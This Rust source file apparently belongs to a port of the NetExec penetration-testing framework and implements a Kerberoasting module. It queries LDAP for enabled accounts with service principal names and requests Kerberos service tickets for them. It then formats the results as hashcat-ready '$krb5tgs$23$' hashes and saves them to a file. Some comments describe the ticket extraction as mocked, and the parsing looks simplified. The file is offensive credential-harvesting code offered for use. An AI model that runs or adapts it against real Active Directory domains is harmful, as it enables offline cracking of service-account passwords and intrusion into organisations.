//! # kerberoasting — LDAP Kerberoasting Module
//!
//! Identifies users with Service Principal Names (SPNs) for Kerberoasting.

use anyhow::Result;
use async_trait::async_trait;
use nxc_protocols::NxcSession;

use crate::{ModuleOption, ModuleOptions, ModuleResult, NxcModule};

/// Kerberoasting identification module.
pub struct Kerberoasting;

impl Kerberoasting {
    pub fn new() -> Self {
        Self
    }
}

impl Default for Kerberoasting {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl NxcModule for Kerberoasting {
    fn name(&self) -> &'static str {
        "kerberoasting"
    }

    fn description(&self) -> &'static str {
        "Identify users with Service Principal Names (SPNs) for Kerberoasting"
    }

    fn supported_protocols(&self) -> &[&str] {
        &["ldap"]
    }

    fn options(&self) -> Vec<ModuleOption> {
        vec![ModuleOption {
            name: "USER".to_string(),
            description: "Specific user to check".to_string(),
            required: false,
            default: None,
        }]
    }

    async fn run(
        &self,
        session: &mut dyn NxcSession,
        opts: &ModuleOptions,
    ) -> Result<ModuleResult> {
        let user_filter = opts.get("USER").map(|s| s.as_str()).unwrap_or("*");

        let ldap_session = match session.protocol() {
            "ldap" => session.downcast_mut::<nxc_protocols::ldap::LdapSession>().unwrap(),
            _ => return Err(anyhow::anyhow!("Module only supports LDAP")),
        };

        let creds = ldap_session
            .credentials
            .clone()
            .ok_or_else(|| anyhow::anyhow!("No credentials available for Kerberoasting"))?;
        let domain = creds.domain.clone().unwrap_or_default();
        let kdc_ip = ldap_session.target.clone();
        let krb_client = nxc_auth::KerberosClient::new(&domain, &kdc_ip);

        let mut tgt = None;
        if !domain.is_empty() {
            // Attempt to fetch TGT for later TGS-REQs
            tgt = krb_client
                .request_tgt(
                    &creds.username,
                    creds.password.as_deref(),
                    creds.nt_hash.as_deref(),
                    None,
                )
                .await
                .ok();
        }

        let protocol = nxc_protocols::ldap::LdapProtocol::new();
        let base_dn = protocol.get_base_dn(ldap_session).await?;

        tracing::debug!("kerberoasting: Searching for Kerberoastable users in {}", base_dn);

        // Filter for users with SPNs that are not disabled
        let filter = format!(
            "(&(objectClass=user)(objectCategory=person)(servicePrincipalName=*)(sAMAccountName={user_filter})(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
        );

        let attrs =
            vec!["sAMAccountName", "servicePrincipalName", "memberOf", "pwdLastSet", "lastLogon"];

        let entries =
            protocol.search(ldap_session, &base_dn, ldap3::Scope::Subtree, &filter, attrs).await?;

        let mut output_lines = Vec::new();
        let mut results = Vec::new();

        output_lines.push(format!("{:<20} {:<30} {:<15}", "Username", "SPN", "Password Last Set"));
        output_lines.push("-".repeat(65));

        for entry in &entries {
            let sam = entry
                .attrs
                .get("sAMAccountName")
                .and_then(|v| v.first())
                .cloned()
                .unwrap_or_default();
            let spns = entry.attrs.get("servicePrincipalName").cloned().unwrap_or_default();
            let pwd_last_set =
                entry.attrs.get("pwdLastSet").and_then(|v| v.first()).cloned().unwrap_or_default();

            for spn in &spns {
                let mut hash_output = "No TGT available for extraction".to_string();

                if let Some(ref valid_tgt) = tgt {
                    if let Ok(tgs) = krb_client.request_tgs(valid_tgt, spn).await {
                        // Mock extraction representing Kerberos TGS-REP hash format
                        let checksum =
                            hex::encode(&tgs.ticket_data[0..16.min(tgs.ticket_data.len())]);
                        let cipher = hex::encode(&tgs.ticket_data[16.min(tgs.ticket_data.len())..]);

                        hash_output =
                            format!("$krb5tgs$23$*{sam}*{domain}${spn}*{checksum}*{cipher}");

                        // Log exactly what hashcat needs
                        tracing::info!("Extracted Hash: {}", hash_output);
                    } else {
                        hash_output = "TGS-REQ Failed (mocked)".to_string();
                    }
                }

                output_lines.push(format!(
                    "{:<20} {:<30} {:<15} {}",
                    sam,
                    spn,
                    pwd_last_set,
                    if hash_output.starts_with("$krb") { "HASH EXTRACTED!" } else { "" }
                ));
                results.push(serde_json::json!({
                    "username": sam,
                    "spn": spn,
                    "pwdLastSet": pwd_last_set,
                    "hash": hash_output
                }));
            }
        }

        if results.is_empty() {
            output_lines.push("No Kerberoastable users found.".to_string());
        }

        // Write hashes to workspace automatically
        let hashes_only: Vec<String> = results
            .iter()
            .filter_map(|r| {
                r["hash"].as_str().filter(|h| h.starts_with("$krb")).map(|h| h.to_string())
            })
            .collect();

        if !hashes_only.is_empty() {
            let file_path = std::env::current_dir()?.join("kerberoastable.txt");
            let mut file =
                std::fs::OpenOptions::new().create(true).append(true).open(&file_path)?;
            use std::io::Write;
            for h in hashes_only {
                writeln!(file, "{h}")?;
            }
            output_lines.push(format!("Saved extracted hashes to {file_path:?}"));
        }

        Ok(ModuleResult {
            credentials: vec![],
            success: true,
            output: output_lines.join("\n"),
            data: serde_json::json!(results),
        })
    }
}
